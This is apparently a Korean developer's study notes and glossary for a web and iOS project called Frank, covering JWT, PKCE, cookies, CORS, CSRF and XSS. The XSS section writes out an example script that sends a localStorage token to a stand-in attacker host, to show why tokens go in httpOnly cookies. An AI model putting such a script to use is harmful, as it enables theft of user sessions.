# 메모 템플릿

> 이 파일 전체 복붙하거나, 채팅에 `/notes` 뒤에 바로 붙여넣어도 됨.
> 빈 칸은 그냥 비워두면 됨. 순간 생각 그대로 적어도 됨.

---

## 용어 사전

> 깊은 설명은 `history/260408_개념정리.md` 참조.
> 흐름 도식 시각 자료는 `history/260409_개념정리_도식화.html` 참조.

---

### 크롤링 (Crawling)
URL을 주면 웹페이지 HTML 전체를 자동으로 가져오는 것. 광고·태그·메뉴·본문 전부 포함.
크롤링 자체는 HTML 전체를 긁어오는 것이고, 본문만 추출하는 정제는 별도 과정.
**Frank**: Firecrawl이 크롤링+정제를 한 번에 처리. Tavily가 URL 찾으면 → Firecrawl이 본문만 추출 → OpenRouter로 요약.

---

### 포트 (Port)
같은 컴퓨터에서 여러 프로그램이 동시에 실행될 때 서로 구분하는 방 번호.
컴퓨터 = 건물, IP주소(localhost) = 건물 주소, 포트 = 방 번호.
**Frank**: Rust API는 :8080, 웹 프론트는 :5173. 웹 브라우저가 5173 화면 열고 → 8080으로 API 호출.

---

### 클라우드
인터넷에 24시간 연결된 남의 서버 컴퓨터. 내 맥북과 달리 꺼지지 않고 누구나 접근 가능.
**Frank**: 서비스 배포 후 api.frank.com이 클라우드에서 실행됨. 개발 중에는 localhost.

---

### Docker
코드 + 실행에 필요한 환경을 하나의 박스로 묶어주는 도구.
**왜 필요**: 내 맥(macOS)과 클라우드 서버(Linux)는 환경이 달라서 내 맥에서 되던 코드가 클라우드에서 안 될 수 있음.
Docker로 묶으면 환경째로 올라가서 어디서든 동일하게 실행 보장.
Docker 자체가 외부 접근을 가능하게 해주는 건 아님. 외부 접근은 클라우드에 올리는 행위 자체.
```
Docker 이미지를 내 맥에서 실행   → 여전히 localhost, 외부 접근 불가
Docker 이미지를 클라우드에서 실행 → 공인 주소 생김, 외부 접근 가능
```
**Frank**: 평소 개발은 `cargo run`으로 충분. `deploy.sh --target=api/front`는 Docker 필요. iOS는 Docker 불필요.
로컬+실제기기 테스트는 `cargo run` + Cloudflare Tunnel만으로 됨.

---

### 샌드박스 / 컨테이너
각 프로그램이 독립된 공간(컨테이너)에서 실행됨. iOS 앱이 서로 데이터를 건드릴 수 없는 것과 동일한 개념.
하나의 컨테이너가 죽어도 다른 컨테이너에 영향 없음.
**Frank**: Rust API 서버와 웹 프론트가 각각 별도 Docker 컨테이너로 실행됨.

---

### SQL / PostgreSQL / NoSQL
- **SQL**: 데이터를 표(테이블) 구조로 저장하고 다루는 언어. `SELECT * FROM articles` 같은 문법.
- **PostgreSQL**: SQL을 쓰는 DB 프로그램 중 하나. MySQL, SQLite와 같은 계열.
- **NoSQL**: 표 구조 없이 문서(JSON) 형태로 저장. SQL 문법 안 씀. Firebase Firestore가 NoSQL.
**Frank**: Supabase가 내부적으로 PostgreSQL 사용. articles·tags·profiles 테이블이 여기 저장됨.

---

### sqlx vs Supabase REST API
- **sqlx**: Rust에서 PostgreSQL DB에 직접 소켓으로 연결하는 라이브러리.
- **Supabase REST API**: HTTP 요청으로 DB를 조회·저장하는 방식.
**Frank**: sqlx 미사용. Rust API가 Supabase REST API(HTTP)로 DB 접근.
Supabase는 인증(Auth)과 DB 호스팅 두 가지 역할. iOS/웹은 인증만 SDK 직접 사용, DB 접근은 Rust API를 통해서만.

---

### fixture / fixture JSON
API 명세(어떤 데이터를 주고받을지)를 확정한 후 만든 고정 목 데이터.
서버 완성 전에 웹·iOS가 화면을 먼저 개발할 수 있도록 "이런 데이터가 올 거야"를 미리 정해둔 것.
나중에 실제 API 완성되면 fixture를 실제 API 응답으로 교체. 이미 스키마가 맞춰져 있어서 불일치 없음.

---

### HTTP 핸들러 (api/)
HTTP 요청이 들어왔을 때 실행되는 함수. iOS의 URLSession 반대편.
역할은 파싱 → 서비스 호출 → 응답 반환만. 비즈니스 로직은 `services/`로 위임.
**Frank**: `GET /me/articles` 요청 → api/articles.rs 핸들러 → services/ 호출 → DB 조회 → JSON 반환.

---

### JWT (JSON Web Token)
로그인 성공 후 서버가 발급하는 "이 사람 맞다는 증명서". 매 API 요청마다 같이 보냄.
세 부분이 `.`으로 구분: `헤더.페이로드.서명`
페이로드에 user_id 등 정보가 들어있음. 암호화가 아니라 서명 — 누구나 열어볼 수 있지만 변조하면 서명이 안 맞아서 서버가 거부.

**암호화 vs 서명 차이**:
- 암호화: 내용을 숨김. 키 없으면 읽을 수 없음.
- 서명: 내용은 읽을 수 있음. 대신 변조하면 들킴. JWT는 서명 방식.

**없으면**: 서버가 "이 요청이 누구 건지" 알 방법이 없음. 모든 사람한테 같은 데이터를 주거나 아예 거부해야 함.
**있으면**: 로그인 → JWT 발급 → 매 요청마다 JWT 첨부 → 서버가 user_id 확인 → 그 사람 데이터만 반환.

---

### Bearer 헤더
JWT를 HTTP 요청에 담아 보내는 형식. JWT 자체가 아니라 JWT를 전달하는 방법.
```
Authorization: Bearer {JWT토큰값}
               ↑전달형식  ↑증명서 내용
```
JWT = 증명서 내용 / Bearer = 그 증명서를 봉투에 넣어 보내는 형식.
**Frank (iOS)**:
```swift
request.setValue("Bearer \(jwt)", forHTTPHeaderField: "Authorization")
```

---

### idToken / access_token / refresh_token

세 가지 모두 토큰이지만 발급 주체와 역할이 다름.

| 토큰 | 발급 주체 | 역할 | 수명 |
|------|---------|------|------|
| idToken | Apple | "이 사람 Apple 계정 맞다" 신원 증명. Supabase 로그인할 때 한 번만 씀 | 1회용 |
| access_token | Supabase | API 호출할 때 쓰는 JWT. 매 요청마다 Bearer 헤더에 담아 보냄 | 짧음 (보통 1시간) |
| refresh_token | Supabase | access_token 만료 시 새로 발급받기 위한 토큰. API 호출엔 직접 안 씀 | 김 |

**흐름**:
```
1. Apple 로그인 → Apple이 idToken 발급
2. idToken을 Supabase에 제출
3. Supabase가 확인 후 access_token(JWT) + refresh_token 발급
4. API 요청마다 access_token을 Bearer 헤더에 담아 Rust API 호출
5. access_token 만료 → refresh_token으로 새 access_token 발급 (재로그인 불필요)
```
Apple은 1번까지만. 2번부터는 Supabase.

---

### nonce
idToken 탈취 후 재사용 공격을 막는 일회용 랜덤 값.
앱이 랜덤 nonce 생성 → Apple 요청에 포함 → Apple이 idToken 안에 nonce를 박아서 발급.
Supabase가 idToken 받으면 nonce 확인 → "지금 이 요청에서 만든 토큰 맞네" 검증.
요청마다 nonce가 새로 생성되니까 탈취한 idToken을 다른 요청에서 재사용 불가.

---

### ASAuthorizationController (iOS)
Apple이 iOS에 기본 제공하는 "Apple로 로그인" 전용 프레임워크.
버튼 탭 → 시스템 시트 → Face ID 확인 → Apple이 idToken 직접 반환.
브라우저 리다이렉트 없이 idToken을 바로 받기 때문에 흐름이 단순함.

```
[Apple로 로그인 탭]
        ↓
ASAuthorizationController 실행 (시스템 시트)
        ↓
Face ID 확인 → Apple 서버 요청
        ↓
idToken 직접 반환 → Supabase 제출 → access_token 발급
```

---

### OAuth / 코드 교환 (웹)
웹은 브라우저라서 iOS처럼 네이티브 시트를 못 띄움. 리다이렉트 방식 사용.
토큰을 URL에 직접 노출하면 브라우저 히스토리에 남거나 탈취될 수 있어서,
임시 code를 먼저 받고 서버에서 안전하게 토큰으로 교환하는 2단계 방식.

```
1. [Apple로 로그인] 클릭
2. 브라우저가 Apple 로그인 페이지로 이동 (리다이렉트)
3. 로그인 성공 → Apple이 임시 code 발급
4. 브라우저가 /auth/callback?code=abc123 으로 돌아옴
5. SvelteKit 서버가 code를 Apple에 제출 → 진짜 토큰으로 교환 (코드 교환)
6. 토큰 받음 → 로그인 완료
```

**코드 교환**: 임시 code → 실제 토큰으로 바꾸는 과정. 서버에서 일어나서 외부에 노출 안 됨.

---

### PKCE
code 교환할 때 "처음 요청한 사람만 교환 가능"하도록 보장하는 보안 장치.
웹 Apple 로그인에서 사용. iOS는 idToken을 직접 받아서 PKCE 불필요.

| | 누가 만드나 | 역할 |
|--|--|--|
| code | Apple | 로그인 성공 증표 (임시 티켓) |
| code_verifier | 브라우저(SvelteKit) | PKCE 보안 검증용 랜덤 값. 내 기기에만 있음 |
| code_challenge | 브라우저(SvelteKit) | code_verifier를 해시한 값. Apple에 미리 전달 |

**PKCE 없으면:**
```
해커가 /auth/callback?code=abc123 에서 code 탈취
→ code만 들고 토큰 교환 시도 → 성공 → 계정 탈취
```

**PKCE 있으면:**
```
1. 브라우저가 code_verifier 생성 → 해시 → code_challenge
2. Apple 요청 시 code_challenge 같이 보냄 → Apple이 기억
3. 로그인 성공 → Apple이 code 발급
4. 해커가 code 탈취해도 code_verifier 모름 → 교환 거부
5. 브라우저가 code + code_verifier 같이 제출
   Apple: "code_verifier 해시 = 내가 기억한 code_challenge 맞네" → 토큰 발급
```

---

### Service ID vs Bundle ID
Apple 로그인 설정 시 iOS와 웹이 다른 식별자 사용.

| | 용도 | 예시 |
|--|--|--|
| Bundle ID | iOS 앱 식별자. ASAuthorizationController에서 사용 | dev.frank.app |
| Service ID | 웹 OAuth 식별자. 리다이렉트 client_id로 사용 | com.frank.web |

**Frank 주의사항**: Supabase Apple Provider의 Client IDs 순서가 중요.
```
❌ dev.frank.app, com.frank.web  → Bundle ID가 client_id로 사용 → 오류
✅ com.frank.web, dev.frank.app  → Service ID가 client_id로 사용 → 정상
```
첫 번째 값이 웹 OAuth의 client_id로 쓰이기 때문에 Service ID가 앞에 와야 함.

---

### iOS vs 웹 Apple 로그인 비교
```
iOS:  ASAuthorizationController → idToken 직접 받음 → Supabase 제출
      (코드 교환 없음, PKCE 없음, Bundle ID 사용)

웹:   리다이렉트 → code 받음 → PKCE로 안전하게 교환 → 토큰
      (코드 교환 있음, PKCE 있음, Service ID 사용)

공통: Supabase → access_token(JWT) 발급 → Rust API 호출
```

---

### 쿠키 (Cookie)
브라우저가 서버로부터 받아서 저장해두는 작은 데이터 조각.
HTTP는 기본적으로 기억이 없어서 (요청-응답 후 연결 끊김), "이 사람이 누구인지"를 기억하기 위해 사용.
브라우저가 매 요청마다 자동으로 쿠키를 같이 보냄.

**저장 위치**: 브라우저가 관리하는 저장공간. 브라우저마다 독립적.
```
Safari → Safari가 관리하는 쿠키 저장소
Chrome → Chrome이 관리하는 쿠키 저장소
브라우저 삭제하면 쿠키도 사라짐
```

---

### 브라우저 저장소 종류
```
쿠키          → 서버가 심어주는 데이터. 요청마다 자동 첨부
localStorage  → JavaScript가 자유롭게 읽고 쓰는 저장소. 브라우저 닫아도 유지
sessionStorage → localStorage랑 같은데 탭 닫으면 사라짐
```

---

### httpOnly 쿠키
JavaScript가 접근할 수 없도록 잠근 쿠키. 서버 ↔ 브라우저 사이에서만 오감.

```
일반 쿠키 / localStorage:
  JavaScript로 읽기 가능
  document.cookie / localStorage.getItem()
  → XSS 공격으로 탈취 가능

httpOnly 쿠키:
  JavaScript로 읽기 불가 (접근 자체 차단)
  브라우저와 서버만 열 수 있음
  → XSS 스크립트가 실행돼도 토큰 탈취 불가
```

**httpOnly = 쿠키에 자물쇠를 채운 것. JavaScript는 열쇠가 없음.**

**Frank에서**:
```
웹 로그인 성공
      ↓
SvelteKit 서버가 access_token을 httpOnly 쿠키에 저장
      ↓
이후 API 요청마다 브라우저가 자동으로 쿠키 첨부
      ↓
Rust 서버가 쿠키에서 토큰 꺼내서 검증
(JavaScript는 이 과정에 관여 못함)
```

---

### XSS (Cross-Site Scripting)
악성 스크립트를 웹페이지에 심어서 다른 사용자의 데이터를 훔치는 공격.
JavaScript가 localStorage / 일반 쿠키에 접근할 수 있어서 토큰 탈취 가능.

```
1. 해커가 댓글에 악성 스크립트 입력
   <script>fetch('해커서버.com?token=' + localStorage.getItem('token'))</script>
2. 다른 사용자가 그 페이지 접속 → 스크립트 실행
3. localStorage 토큰이 해커 서버로 전송 → 계정 탈취
```

**방어**: 토큰을 httpOnly 쿠키에 저장 → JavaScript 접근 차단 → 스크립트 실행돼도 탈취 불가.

---

### Keychain (iOS)
iOS 기기 OS 레벨에서 관리하는 암호화된 안전한 저장소.
앱 바깥(OS 레벨)에 저장되어서 다른 앱 접근 불가. 앱 삭제해도 데이터 유지.

**iOS 저장소 종류:**
```
UserDefaults  → 앱 설정 같은 가벼운 데이터. 암호화 없음
Keychain      → 민감한 데이터 (토큰, 비밀번호). OS 레벨 암호화. 앱 삭제해도 유지
파일 시스템    → 앱 샌드박스 안의 파일 저장
```

---

### 인증 흐름 vs 서비스 흐름

가장 헷갈리기 쉬운 분리. 멘토 발표에서 두 흐름이 섞여서 설명됐던 부분.

**인증 흐름**: Supabase SDK가 처리. Rust 서버 없음.
```
앱 → Apple → idToken → Supabase SDK → access_token + refresh_token
```

**서비스 흐름**: Rust API가 처리.
```
앱 → Rust API (Bearer access_token) → Supabase DB → 응답
```

핵심: 인증이 끝나서 access_token을 받은 다음부터가 서비스 흐름.
Rust 서버가 등장하는 건 인증 이후의 데이터 요청부터.

---

### CORS (Cross-Origin Resource Sharing)
브라우저가 다른 출처(프로토콜+도메인+포트 다른 곳)에 요청 시 적용되는 보안 정책.
출처가 다르면 브라우저가 막음. 서버가 응답 헤더에 허락할 출처를 명시해야 통과.
```
웹(localhost:5173) → API(localhost:8080) : 포트 달라서 다른 출처 → CORS 필요
```
iOS 앱, Postman 등 브라우저가 아닌 환경은 CORS 해당 없음.
**Frank**: Rust 서버 CORS 미들웨어로 localhost:5173 (개발) / frank.com (배포) 허용.

---

### CSRF (Cross-Site Request Forgery)
사용자가 의도하지 않은 요청을 악성 사이트가 대신 보내는 공격.
쿠키가 매 요청마다 자동 첨부되는 특성을 악용.
```
1. frank.com 로그인 → 쿠키에 세션 저장
2. evil.com 방문 → 숨겨진 코드가 frank.com으로 요청 전송
3. 브라우저가 쿠키 자동 첨부 → 서버가 인증된 요청으로 처리
```
방어: SameSite 쿠키 (다른 사이트 요청엔 쿠키 안 붙임).
**Frank**: `@supabase/ssr`이 httpOnly + SameSite 설정 자동 처리.

| | CORS | CSRF |
|--|------|------|
| 막는 것 | 다른 출처에서 데이터 읽기 | 사용자 세션을 이용한 조작 |
| 주체 | 브라우저가 강제 | 서버가 방어 |
| Frank | Rust CORS 미들웨어 | Supabase SSR SameSite |

---

### httpOnly 쿠키 vs Keychain 비교
```
공통점:
  둘 다 "일반 코드/스크립트가 직접 접근 불가"
  OS/브라우저 레벨에서 보호
  토큰 저장용으로 가장 안전한 선택

차이점:
  httpOnly 쿠키 → 브라우저가 서버 요청마다 자동 첨부
  Keychain      → 앱이 명시적으로 꺼내서 Bearer 헤더에 담아 보냄
```

**Frank 토큰 저장 위치:**
```
웹   → httpOnly 쿠키 (JavaScript 접근 불가, 브라우저가 자동 첨부)
iOS  → Keychain    (다른 앱 접근 불가, 앱이 꺼내서 Bearer 헤더에 담음)
```

---

[?] — 모르는 것 / 나중에 공부할 개념

## 인증/보안 관련 (260409 멘토 발표 후 정리)

> 나선형 학습 원칙: 설명할 수 있을 정도로만 이해하고 넘어가기.

- [x] HttpOnly 쿠키 세션 — JS 접근 불가, XSS 방어, iOS Keychain과 동일 역할
- [x] JWT — 서명 기반 증명서. 내용 읽을 수 있지만 변조하면 거부
- [x] 코드 교환 흐름 — 임시 code → 토큰 교환. 서버에서 처리해서 노출 안 됨
- [x] PKCE — code 탈취해도 code_verifier 없으면 교환 불가. Supabase SDK가 자동 처리
- [x] idToken + nonce — idToken 탈취 재사용 방지. 1회용 랜덤 값이 idToken 안에 포함됨
- [x] XSS 방어 — localStorage 대신 httpOnly 쿠키 → JS 접근 차단
- [x] Rust API 단일화 — 태그·기사·프로필은 Supabase 직접에서 Rust API로 통합. 수집·요약은 원래부터 Rust
- [x] CSRF — 사용자 모르게 요청 보내는 공격. SameSite 쿠키로 방어. Supabase SSR이 처리
- [x] CORS — 다른 출처 요청 시 브라우저가 막음. Rust 서버 CORS 미들웨어로 허용 출처 명시
- [x] 도커 샌드박스 — 왜 샌드박스라고 부르는가, 로컬 직접 실행과의 차이


---

[팁] — 멘토 또는 Claude 꿀팁


---

[버그] — 발견된 버그 / 기능 이상


---

[나중에] — 지금 말고 이후에 할 것


---

기타 — 분류 모르겠는 것 / 그냥 생각나는 것


